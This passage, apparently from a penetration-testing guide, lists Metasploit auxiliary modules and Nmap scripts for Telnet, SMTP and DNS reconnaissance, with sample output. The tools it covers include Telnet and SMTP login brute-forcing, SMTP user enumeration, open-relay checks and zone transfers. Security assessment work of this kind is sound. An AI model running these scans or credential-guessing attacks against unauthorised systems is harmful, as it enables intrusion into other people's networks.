<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">telnet</span><span class="o">/</span><span class="n">telnet_version</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">23</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.13</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">23</span> <span class="n">TELNET</span> <span class="p">(</span><span class="n">ttyp0</span><span class="p">)</span>\<span class="n">x0d</span>\<span class="n">x0a</span>\<span class="n">x0d</span>\<span class="n">x0alogin</span><span class="p">:</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.13</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">23</span> <span class="n">TELNET</span> <span class="n">User</span> <span class="n">Access</span> <span class="n">Verification</span>\<span class="n">x0a</span>\<span class="n">x0aUsername</span><span class="p">:</span>
</pre></div>
</div>
<p>One sad thing is telnet_version overwrites the Nmap banner, which is most probably not good. Need to check how we can avoid this. may be not run version modules?</p>
<p>We could have used nmap banners for telnet for example: below for the SNMP modules. As routers/switches are mostly uses SNMP.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="mf">10.23</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>   <span class="mi">23</span>    <span class="n">tcp</span>    <span class="n">telnet</span>      <span class="nb">open</span>   <span class="n">Usually</span> <span class="n">a</span> <span class="n">Cisco</span><span class="o">/</span><span class="mi">3</span><span class="n">com</span> <span class="n">switch</span>
<span class="mf">10.23</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>   <span class="mi">23</span>    <span class="n">tcp</span>    <span class="n">telnet</span>      <span class="nb">open</span>   <span class="n">Aruba</span> <span class="n">switch</span> <span class="n">telnetd</span>
<span class="mf">10.87</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>   <span class="mi">23</span>    <span class="n">tcp</span>    <span class="n">telnet</span>      <span class="nb">open</span>   <span class="n">Dell</span> <span class="n">PowerConnect</span> <span class="n">switch</span> <span class="n">telnetd</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>   <span class="mi">23</span>    <span class="n">tcp</span>    <span class="n">telnet</span>      <span class="nb">open</span>   <span class="n">Cisco</span> <span class="n">router</span> <span class="n">telnetd</span>
<span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>   <span class="mi">23</span>    <span class="n">tcp</span>    <span class="n">telnet</span>      <span class="nb">open</span>   <span class="n">Pirelli</span> <span class="n">NetGate</span> <span class="n">VOIP</span> <span class="n">v2</span> <span class="n">broadband</span> <span class="n">router</span> <span class="n">telnetd</span>
</pre></div>
</div>
</div>
<div class="section" id="telnet-login-check-scanner">
<h4>Telnet Login Check Scanner<a class="headerlink" href="#telnet-login-check-scanner" title="Permalink to this headline">¶</a></h4>
<p>Test a telnet login on a range of machines and report successful logins.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">telnet</span><span class="o">/</span><span class="n">telnet_login</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">23</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id4">
<h3>Nmap<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h3>
<p>Two NSEs</p>
<div class="section" id="telnet-brute">
<h4>Telnet-brute<a class="headerlink" href="#telnet-brute" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/telnet-brute.html">telnet-brute.nse</a> : Performs brute-force password auditing against telnet servers.</p>
<p>and</p>
</div>
<div class="section" id="telnet-encryption">
<h4>Telnet-encryption<a class="headerlink" href="#telnet-encryption" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/telnet-encryption.html">telnet-encryption.nse</a> : Determines whether the encryption option is supported on a remote telnet server.</p>
</div>
</div>
</div>
<div class="section" id="smtp-port-25-and-submission-port-587">
<h2>SMTP | Port 25 and Submission Port 587<a class="headerlink" href="#smtp-port-25-and-submission-port-587" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id5">
<h3>Metasploit<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h3>
<div class="section" id="smtp-version">
<h4>SMTP_Version<a class="headerlink" href="#smtp-version" title="Permalink to this headline">¶</a></h4>
<p>SMTP Banner Grabber.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">smtp</span><span class="o">/</span><span class="n">smtp_version</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">25</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">25</span> <span class="n">SMTP</span> <span class="mi">220</span> <span class="n">xxxx</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="n">Microsoft</span> <span class="n">ESMTP</span> <span class="n">MAIL</span> <span class="n">Service</span><span class="p">,</span> <span class="n">Version</span><span class="p">:</span> <span class="mf">6.0</span><span class="o">.</span><span class="mf">3790.4675</span> <span class="n">ready</span> <span class="n">at</span>  <span class="n">Thu</span><span class="p">,</span> <span class="mi">3</span> <span class="n">Mar</span> <span class="mi">2016</span> <span class="mi">18</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">44</span> <span class="o">+</span><span class="mi">0530</span> \<span class="n">x0d</span>\<span class="n">x0a</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">25</span> <span class="n">SMTP</span> <span class="mi">220</span> <span class="n">smtpsrv</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="n">ESMTP</span> <span class="n">Sendmail</span><span class="p">;</span> <span class="n">Thu</span><span class="p">,</span> <span class="mi">3</span> <span class="n">Mar</span> <span class="mi">2016</span> <span class="mi">18</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">39</span> <span class="o">+</span><span class="mi">0530</span>\<span class="n">x0d</span>\<span class="n">x0a</span>
</pre></div>
</div>
</div>
<div class="section" id="smtp-open-relays">
<h4>SMTP Open Relays<a class="headerlink" href="#smtp-open-relays" title="Permalink to this headline">¶</a></h4>
<p>Tests if an SMTP server will accept (via a code 250) an e-mail by using a variation of testing methods</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">smtp</span><span class="o">/</span><span class="n">smtp_relay</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">25</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>You might want to change MAILFROM and MAILTO, if you want to see if they are actual open relays client might receive emails.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.16</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">25</span> <span class="o">-</span> <span class="n">Potential</span> <span class="nb">open</span> <span class="n">SMTP</span> <span class="n">relay</span> <span class="n">detected</span><span class="p">:</span> <span class="o">-</span> <span class="n">MAIL</span> <span class="n">FROM</span><span class="p">:</span><span class="o">&lt;</span><span class="n">sender</span><span class="nd">@example</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span> <span class="o">-&gt;</span> <span class="n">RCPT</span> <span class="n">TO</span><span class="p">:</span><span class="o">&lt;</span><span class="n">target</span><span class="nd">@example</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">172.16</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">25</span> <span class="o">-</span> <span class="n">No</span> <span class="n">relay</span> <span class="n">detected</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">172.16</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">25</span> <span class="o">-</span> <span class="n">Potential</span> <span class="nb">open</span> <span class="n">SMTP</span> <span class="n">relay</span> <span class="n">detected</span><span class="p">:</span> <span class="o">-</span> <span class="n">MAIL</span> <span class="n">FROM</span><span class="p">:</span><span class="o">&lt;</span><span class="n">sender</span><span class="nd">@example</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span> <span class="o">-&gt;</span> <span class="n">RCPT</span> <span class="n">TO</span><span class="p">:</span><span class="o">&lt;</span><span class="n">target</span><span class="nd">@example</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span>
</pre></div>
</div>
</div>
<div class="section" id="smtp-user-enumeration-utility">
<h4>SMTP User Enumeration Utility<a class="headerlink" href="#smtp-user-enumeration-utility" title="Permalink to this headline">¶</a></h4>
<p>Allows the enumeration of users: VRFY (confirming the names of valid users) and EXPN (which reveals the actual address of users aliases and lists of e-mail (mailing lists)). Through the implementation of these SMTP commands can reveal a list of valid users. User files contains only Unix usernames so it skips the Microsoft based Email SMTP Server. This can be changed using UNIXONLY option and custom user list can also be provided.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">smtp</span><span class="o">/</span><span class="n">smtp_enum</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">25</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">25</span> <span class="n">Skipping</span> <span class="n">microsoft</span> <span class="p">(</span><span class="mi">220</span> <span class="n">ftpsrv</span> <span class="n">Microsoft</span> <span class="n">ESMTP</span> <span class="n">MAIL</span> <span class="n">Service</span><span class="p">,</span> <span class="n">Version</span><span class="p">:</span> <span class="mf">6.0</span><span class="o">.</span><span class="mf">3790.4675</span> <span class="n">ready</span> <span class="n">at</span>  <span class="n">Thu</span><span class="p">,</span> <span class="mi">3</span> <span class="n">Mar</span> <span class="mi">2016</span> <span class="mi">18</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">49</span> <span class="o">+</span><span class="mi">0530</span> <span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">25</span> <span class="n">Users</span> <span class="n">found</span><span class="p">:</span> <span class="n">adm</span><span class="p">,</span> <span class="n">admin</span><span class="p">,</span> <span class="n">avahi</span><span class="p">,</span> <span class="n">avahi</span><span class="o">-</span><span class="n">autoipd</span><span class="p">,</span> <span class="nb">bin</span><span class="p">,</span> <span class="n">daemon</span><span class="p">,</span> <span class="n">fax</span><span class="p">,</span> <span class="n">ftp</span><span class="p">,</span> <span class="n">games</span><span class="p">,</span> <span class="n">gdm</span><span class="p">,</span> <span class="n">gopher</span><span class="p">,</span> <span class="n">haldaemon</span><span class="p">,</span> <span class="n">halt</span><span class="p">,</span> <span class="n">lp</span><span class="p">,</span> <span class="n">mail</span><span class="p">,</span> <span class="n">news</span><span class="p">,</span> <span class="n">nobody</span><span class="p">,</span> <span class="n">operator</span><span class="p">,</span> <span class="n">postgres</span><span class="p">,</span> <span class="n">postmaster</span><span class="p">,</span> <span class="n">sshd</span><span class="p">,</span> <span class="n">sync</span><span class="p">,</span> <span class="n">uucp</span><span class="p">,</span> <span class="n">webmaster</span><span class="p">,</span> <span class="n">www</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="nmap-nse">
<h3>Nmap NSE<a class="headerlink" href="#nmap-nse" title="Permalink to this headline">¶</a></h3>
<div class="section" id="smtp-brute">
<h4>SMTP-brute<a class="headerlink" href="#smtp-brute" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/smtp-brute.html">smtp-brute.nse</a> : Performs brute force password auditing against SMTP servers using either LOGIN, PLAIN, CRAM-MD5, DIGEST-MD5 or NTLM authentication.</p>
</div>
<div class="section" id="smtp-commands">
<h4>SMTP-Commands<a class="headerlink" href="#smtp-commands" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/smtp-commands.html">smtp-commands.nse</a> : Attempts to use EHLO and HELP to gather the Extended commands supported by an SMTP server.</p>
</div>
<div class="section" id="smtp-enum-users">
<h4>SMTP-enum-users<a class="headerlink" href="#smtp-enum-users" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/smtp-enum-users.html">smtp-enum-users.nse</a> : Attempts to enumerate the users on a SMTP server by issuing the VRFY, EXPN or RCPT TO commands. The goal of this script is to discover all the user accounts in the remote system. Similar to SMTP_ENUM in metasploit.</p>
</div>
<div class="section" id="smtp-open-relay">
<h4>SMTP-open-relay<a class="headerlink" href="#smtp-open-relay" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/smtp-open-relay.html">smtp-open-relay.nse</a> : Attempts to relay mail by issuing a predefined combination of SMTP commands. The goal of this script is to tell if a SMTP server is vulnerable to mail relaying.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>nmap -iL email_servers -v --script=smtp-open-relay -p 25
Nmap scan report for 10.10.xx.xx
Host is up (0.00039s latency).
PORT     STATE  SERVICE
25/tcp   open   smtp
| smtp-open-relay: Server is an open relay (14/16 tests)
|  MAIL FROM:&lt;&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@nmap.scanme.org&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@sysmailsrv.example.com&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;relaytest%nmap.scanme.org@[10.10.8.136]&gt;
|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;relaytest%nmap.scanme.org@sysmailsrv.example.com&gt;
|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;&quot;relaytest@nmap.scanme.org&quot;&gt;
|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;&quot;relaytest%nmap.scanme.org&quot;&gt;
|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;&quot;relaytest@nmap.scanme.org&quot;@[10.10.8.136]&gt;
|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;@[10.10.8.136]:relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;@sysmailsrv.example.com:relaytest@nmap.scanme.org&gt;
|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest&gt;
|  MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest@[10.10.8.136]&gt;
|_ MAIL FROM:&lt;antispam@[10.10.xx.xx]&gt; -&gt; RCPT TO:&lt;nmap.scanme.org!relaytest@sysmailsrv.example.com&gt;
MAC Address: 00:50:56:B2:21:A9 (VMware)
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="dns-port-53">
<h2>DNS - Port 53<a class="headerlink" href="#dns-port-53" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id6">
<h3>Metasploit<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h3>
<div class="section" id="dns-bruteforce-enumeration">
<h4>DNS Bruteforce Enumeration<a class="headerlink" href="#dns-bruteforce-enumeration" title="Permalink to this headline">¶</a></h4>
<p>Uses a dictionary to perform a bruteforce attack to enumerate hostnames and subdomains available under a given domain</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">dns_bruteforce</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Host</span> <span class="n">autodiscover</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="k">with</span> <span class="n">address</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">found</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Host</span> <span class="n">b2b</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="k">with</span> <span class="n">address</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">found</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Host</span> <span class="n">blog</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span> <span class="k">with</span> <span class="n">address</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">found</span>
</pre></div>
</div>
</div>
<div class="section" id="dns-basic-information-enumeration">
<h4>DNS Basic Information Enumeration<a class="headerlink" href="#dns-basic-information-enumeration" title="Permalink to this headline">¶</a></h4>
<p>Module enumerates basic DNS information for a given domain. The module gets information regarding to A (addresses), AAAA (IPv6 addresses), NS (name servers), SOA (start of authority) and MX (mail servers) records for a given domain. In addition, this module retrieves information stored in TXT records.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">dns_info</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>[*] Enumerating example.com
[+] example.com - Address 93.184.xx.xx found. Record type: A
[+] example.com - Address 2606:2800:220:1:248:1893:25c8:1946 found. Record type: AAAA
[+] example.com - Name server a.iana-servers.net (199.43.xx.xx) found. Record type: NS
[+] example.com - Name server a.iana-servers.net (2001:500:8c::53) found. Record type: NS
[+] example.com - Name server b.iana-servers.net (199.43.xx.xx) found. Record type: NS
[+] example.com - Name server b.iana-servers.net (2001:500:8d::53) found. Record type: NS
[+] example.com - sns.dns.icann.org (199.4.xx.xx) found. Record type: SOA
[+] example.com - sns.dns.icann.org (64:ff9b::c704:1c1a) found. Record type: SOA
[+] example.com - Text info found: v=spf1 -all . Record type: TXT
[+] example.com - Text info found: $Id: example.com 4415 2015-08-24 20:12:23Z davids $ . Record type: TXT
[*] Auxiliary module execution completed
</pre></div>
</div>
</div>
<div class="section" id="dns-reverse-lookup-enumeration">
<h4>DNS Reverse Lookup Enumeration<a class="headerlink" href="#dns-reverse-lookup-enumeration" title="Permalink to this headline">¶</a></h4>
<p>Module performs DNS reverse lookup against a given IP range in order to retrieve valid addresses and names.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">dns_reverse_lookup</span>
</pre></div>
</div>
</div>
<div class="section" id="dns-common-service-record-enumeration">
<h4>DNS Common Service Record Enumeration<a class="headerlink" href="#dns-common-service-record-enumeration" title="Permalink to this headline">¶</a></h4>
<p>Module enumerates common DNS service records in a given domain.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">dns_srv_enum</span>
<span class="nb">set</span> <span class="n">domain</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span>
<span class="n">run</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Enumerating</span> <span class="n">SRV</span> <span class="n">Records</span> <span class="k">for</span> <span class="n">example</span><span class="o">.</span><span class="n">com</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Host</span><span class="p">:</span> <span class="n">sipfed</span><span class="o">.</span><span class="n">online</span><span class="o">.</span><span class="n">lync</span><span class="o">.</span><span class="n">com</span> <span class="n">IP</span><span class="p">:</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">Service</span><span class="p">:</span> <span class="n">sipfederationtls</span> <span class="n">Protocol</span><span class="p">:</span> <span class="n">tcp</span> <span class="n">Port</span><span class="p">:</span> <span class="mi">5061</span> <span class="n">Query</span><span class="p">:</span> <span class="n">_sipfederationtls</span><span class="o">.</span><span class="n">_tcp</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Host</span><span class="p">:</span> <span class="n">sipfed</span><span class="o">.</span><span class="n">online</span><span class="o">.</span><span class="n">lync</span><span class="o">.</span><span class="n">com</span> <span class="n">IP</span><span class="p">:</span> <span class="mi">2</span><span class="n">a01</span><span class="p">:</span><span class="n">XXX</span><span class="p">:</span><span class="n">XXXX</span><span class="p">:</span><span class="mi">2</span><span class="p">::</span><span class="n">b</span> <span class="n">Service</span><span class="p">:</span> <span class="n">sipfederationtls</span> <span class="n">Protocol</span><span class="p">:</span> <span class="n">tcp</span> <span class="n">Port</span><span class="p">:</span> <span class="mi">5061</span> <span class="n">Query</span><span class="p">:</span> <span class="n">_sipfederationtls</span><span class="o">.</span><span class="n">_tcp</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Auxiliary</span> <span class="n">module</span> <span class="n">execution</span> <span class="n">completed</span>
</pre></div>
</div>
</div>
<div class="section" id="dns-record-scanner-and-enumerator">
<h4>DNS Record Scanner and Enumerator<a class="headerlink" href="#dns-record-scanner-and-enumerator" title="Permalink to this headline">¶</a></h4>
<p>Module can be used to gather information about a domain from a given DNS server by performing various DNS queries such as zone transfers, reverse lookups, SRV record bruteforcing, and other techniques.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">gather</span><span class="o">/</span><span class="n">enum_dns</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">DNS</span> <span class="n">Server</span> <span class="n">to</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span> <span class="n">NS</span><span class="p">:</span> <span class="mf">81.4</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Retrieving</span> <span class="n">general</span> <span class="n">DNS</span> <span class="n">records</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Domain</span><span class="p">:</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span> <span class="n">IP</span> <span class="n">address</span><span class="p">:</span> <span class="mf">217.147</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">Record</span><span class="p">:</span> <span class="n">A</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Name</span><span class="p">:</span> <span class="n">ASPMX</span><span class="o">.</span><span class="n">L</span><span class="o">.</span><span class="n">GOOGLE</span><span class="o">.</span><span class="n">COM</span><span class="o">.</span> <span class="n">Preference</span><span class="p">:</span> <span class="mi">0</span> <span class="n">Record</span><span class="p">:</span> <span class="n">MX</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Name</span><span class="p">:</span> <span class="n">ASPMX3</span><span class="o">.</span><span class="n">GOOGLEMAIL</span><span class="o">.</span><span class="n">COM</span><span class="o">.</span> <span class="n">Preference</span><span class="p">:</span> <span class="mi">20</span> <span class="n">Record</span><span class="p">:</span> <span class="n">MX</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Name</span><span class="p">:</span> <span class="n">ALT1</span><span class="o">.</span><span class="n">ASPMX</span><span class="o">.</span><span class="n">L</span><span class="o">.</span><span class="n">GOOGLE</span><span class="o">.</span><span class="n">COM</span><span class="o">.</span> <span class="n">Preference</span><span class="p">:</span> <span class="mi">10</span> <span class="n">Record</span><span class="p">:</span> <span class="n">MX</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Name</span><span class="p">:</span> <span class="n">ASPMX5</span><span class="o">.</span><span class="n">GOOGLEMAIL</span><span class="o">.</span><span class="n">COM</span><span class="o">.</span> <span class="n">Preference</span><span class="p">:</span> <span class="mi">20</span> <span class="n">Record</span><span class="p">:</span> <span class="n">MX</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Name</span><span class="p">:</span> <span class="n">ASPMX2</span><span class="o">.</span><span class="n">GOOGLEMAIL</span><span class="o">.</span><span class="n">COM</span><span class="o">.</span> <span class="n">Preference</span><span class="p">:</span> <span class="mi">20</span> <span class="n">Record</span><span class="p">:</span> <span class="n">MX</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Name</span><span class="p">:</span> <span class="n">ASPMX4</span><span class="o">.</span><span class="n">GOOGLEMAIL</span><span class="o">.</span><span class="n">COM</span><span class="o">.</span> <span class="n">Preference</span><span class="p">:</span> <span class="mi">20</span> <span class="n">Record</span><span class="p">:</span> <span class="n">MX</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Name</span><span class="p">:</span> <span class="n">ALT2</span><span class="o">.</span><span class="n">ASPMX</span><span class="o">.</span><span class="n">L</span><span class="o">.</span><span class="n">GOOGLE</span><span class="o">.</span><span class="n">COM</span><span class="o">.</span> <span class="n">Preference</span><span class="p">:</span> <span class="mi">10</span> <span class="n">Record</span><span class="p">:</span> <span class="n">MX</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>        <span class="mi">301</span>     <span class="n">IN</span>      <span class="n">TXT</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Text</span><span class="p">:</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span><span class="o">.</span>        <span class="mi">301</span>     <span class="n">IN</span>      <span class="n">TXT</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Performing</span> <span class="n">zone</span> <span class="n">transfer</span> <span class="n">against</span> <span class="nb">all</span> <span class="n">nameservers</span> <span class="ow">in</span> <span class="n">zonetransfer</span><span class="o">.</span><span class="n">me</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Testing</span> <span class="n">nameserver</span><span class="p">:</span> <span class="n">nsztm2</span><span class="o">.</span><span class="n">digi</span><span class="o">.</span><span class="n">ninja</span><span class="o">.</span>
<span class="n">W</span><span class="p">,</span> <span class="p">[</span><span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">05</span><span class="n">T22</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mf">16.834590</span> <span class="c1">#15019]  WARN -- : AXFR query, switching to TCP</span>
<span class="n">W</span><span class="p">,</span> <span class="p">[</span><span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">05</span><span class="n">T22</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mf">17.490698</span> <span class="c1">#15019]  WARN -- : Error parsing axfr response: undefined method `+&#39; for nil:NilClass</span>
<span class="n">W</span><span class="p">,</span> <span class="p">[</span><span class="mi">2016</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">05</span><span class="n">T22</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mf">32.047468</span> <span class="c1">#15019]  WARN -- : Nameserver 167.88.xx.xx not responding within TCP timeout, trying next one</span>
